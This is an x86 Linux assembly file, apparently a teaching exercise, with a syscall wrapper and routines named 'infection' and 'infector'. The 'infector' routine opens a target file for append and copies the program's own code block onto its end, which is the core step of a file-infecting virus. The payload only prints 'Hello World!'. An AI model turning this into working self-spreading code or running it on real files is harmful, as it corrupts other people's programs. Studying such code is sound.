section .text
section .data
  msg db 'Hello World!' , 0xa
  len equ $ - msg ; length of msg
  fileDescriptor dd 0
global _start
global system_call
global infection
global infector
extern main
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop

system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:
  infection:
      push    ebp ; save caller state
      mov ebp,esp
      pushad

      mov eax, 4 ; sys write command in eax
      mov ebx, 1 ; put stdout file descriptor in ebx
      mov ecx, msg ; put the msg adress in ecx
      mov edx, len ; put the length of msg in edx
      int 0x80 ; Transfer control to the operating system
      popad    ; Restore caller state
      pop ebp  ; Restore caller state
      ret

  infector:
      push    ebp ; save caller state
      mov ebp,esp
      pushad

      mov eax, 5 ; Start of open system Call
      mov ebx , [ebp + 8] ; put file name in ebx
      mov ecx , 0x401 ; put open for append access bits
      mov edx, 0777
      int 0x80 ; Transfer control to the operating system

      mov ebx, eax  ; Start of Write System Call , put file descriptor in ebx
      mov [fileDescriptor], eax ; save file descriptor
      mov eax, 4 ; sys write command in eax
      mov ecx, code_start  ; put the code_start code in the end of the file
      mov edx, code_end  ; put the code_end in edx
      sub edx,ecx   ; put the length of the code between start to end in edx
      int 0x80  ; Transfer control to the operating system

      mov eax, 6  ; Start of close system call , put close command in eax
      mov ebx,[fileDescriptor] ; put file descriptor in ebx
      int 0x80   ; Transfer control to the operating system


      popad    ; Restore caller state
      pop ebp  ; Restore caller state
      ret
code_end:
